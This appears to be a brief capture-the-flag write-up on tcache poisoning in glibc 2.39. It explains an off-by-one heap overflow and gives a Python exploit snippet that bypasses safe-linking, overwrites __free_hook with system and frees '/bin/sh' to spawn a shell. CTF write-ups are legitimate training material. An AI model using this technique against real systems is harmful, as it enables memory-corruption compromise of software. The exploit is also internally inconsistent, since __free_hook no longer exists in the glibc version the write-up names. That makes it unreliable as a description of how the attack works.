---
title: "House of Aurora — Tcache Poisoning in glibc 2.39"
ctf: "0CTF Finals 2026"
category: "pwn"
difficulty: "hard"
points: 500
date: "2026-01-21"
lat: 64.13
lng: -21.94
summary: "Bypassing tcache safe-linking with a single byte off-by-one to land a write-where-what primitive."
tags: ["heap", "tcache", "safe-linking"]
---

## Setup

glibc 2.39 introduced stricter tcache checks but safe-linking can still be defeated when you have a heap leak.

## The Off-by-One

A loop using `<= size` instead of `< size` lets us overflow one byte into the next chunk's size field — extending it into an overlapping chunk.

## Poisoning

```python
heap_base = leak_heap()
fd = (heap_base >> 12) ^ target_addr
edit(overlap_chunk, p64(fd))
malloc(0x40)
chunk = malloc(0x40)  # = __free_hook
edit(chunk, p64(libc.sym.system))
free("/bin/sh\x00")
```

> Heap exploitation is 10% creativity, 90% remembering which fields glibc validates this week.

**Flag:** `0CTF{aur0r4_b0r34lis_0v3r_th3_h34p}`